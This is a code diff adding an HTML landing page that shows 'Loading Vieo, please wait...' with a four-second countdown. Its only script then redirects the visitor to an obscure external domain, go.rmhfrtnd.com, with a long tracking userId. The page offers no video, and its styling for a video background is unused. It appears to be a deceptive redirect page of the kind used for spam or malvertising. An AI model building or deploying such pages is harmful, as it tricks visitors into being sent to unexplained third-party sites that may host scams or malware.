@@ -1,0 +1,90 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Landing Page</title>
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    body, html {
+      height: 100%;
+      font-family: Arial, sans-serif;
+    }
+
+    .video-background {
+      position: fixed;
+      top: 0;
+      left: 0;
+      min-width: 100%;
+      min-height: 100%;
+      object-fit: cover;
+      z-index: -1;
+    }
+
+    .overlay {
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background-color: rgba(0,0,0,0.5); /* optional: dark overlay */
+      z-index: 0;
+    }
+
+    .content {
+      position: relative;
+      z-index: 1;
+      color: white;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+      text-align: center;
+      padding: 20px;
+    }
+
+    h1 {
+      font-size: 3rem;
+    }
+
+    p {
+      font-size: 1.5rem;
+      max-width: 600px;
+    }
+
+    @media (max-width: 768px) {
+      h1 {
+        font-size: 2rem;
+      }
+
+      p {
+        font-size: 1rem;
+      }
+    }
+  </style>
+  <script>
+    let seconds = 4;
+    function updateCountdown() {
+      document.getElementById("timer").textContent = seconds;
+      if (seconds <= 0) {
+        window.location.href = "https://go.rmhfrtnd.com?userId=ccee5d714bb0d20389b5a836219d0e0ba1c0af90c35c74b00ea6f1ca1cfda01b";
+      }
+      seconds--;
+    }
+    window.onload = function() {
+      updateCountdown();
+      setInterval(updateCountdown, 1000);
+    }
+  </script>
+</head>
+<body>
+  <h1>Loading Vieo, please wait...</h1>
+  <div class="countdown"> <span id="timer">4</span> seconds...</div>
+</body>
+</html>
